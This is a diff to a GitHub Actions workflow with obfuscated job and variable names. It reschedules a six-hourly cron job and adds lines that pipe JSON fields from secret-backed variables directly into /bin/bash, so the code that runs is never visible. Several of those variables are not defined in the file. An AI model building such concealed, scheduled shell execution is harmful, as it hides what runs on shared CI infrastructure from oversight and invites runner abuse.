@@ -2,8 +2,7 @@ name: weibushuang5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
-
+    - cron: '26 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: weibushuang5678
         env:
-          pvq017: ${{ secrets.pvq017 }}
+          ffum97389: ${{ secrets.ffum97389 }}
         run: |
-          echo $pvq017 | jq -r .dcqf5781 | /bin/bash
-          echo $ds41633 | jq -r .cacpb813 | /bin/bash
+          echo $ffum97389 | jq -r .uq66 | /bin/bash
+          echo $xa1861 | jq -r .dyv19213 | /bin/bash
+          echo $nfb0 | jq -r .faey23800 | /bin/bash
+          echo $umld7774 | jq -r .xaxo85980 | /bin/bash
 
